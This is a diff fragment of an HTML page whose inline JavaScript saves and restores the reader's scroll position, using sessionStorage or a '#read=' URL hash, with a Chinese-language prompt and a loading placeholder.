+            sessionStorage.setItem(location.pathname + "_read_y", p);
+        }
+        // URL 中是否包含传递的坐标信息
+        setTimeout(() => {
+            if (location.hash.split("#read=").length > 1) {
+                prompt_core("已有阅读进度，正在跳转", 4800, true);
+                // 分离字符串
+                let read_y = location.hash.split("#read=")[1];
+                read_y = read_y.split(":");
+                // 组合乘积，顺滑移动至坐标
+                window.scrollTo({top: Math.round(Number(read_y[0]) * Number(read_y[1] * Number(read_y[2] / wx / wy))), behavior: "smooth"});
+            } else {
+                // 从 sessionStorage 中获取
+                let read_y = sessionStorage.getItem(location.pathname + "_read_y") || "0:0:0";
+                read_y = read_y.split(":");
+                if (read_y[0] != "0") prompt_core("已有阅读进度，正在跳转", 4800, true);
+                window.scrollTo({top: Math.round(Number(read_y[0]) * Number(read_y[1] * Number(read_y[2] / wx / wy))), behavior: "smooth"});
+            }
+        }, 500);
+        window.onscroll = windowScroll;
+    </script>
+
+
+
+
+
+        </div>
+        <div id="css-loading">
+            <h3 class="text-center">加载中...</h3>
+        </div>
+        
+    </body>
+</html>
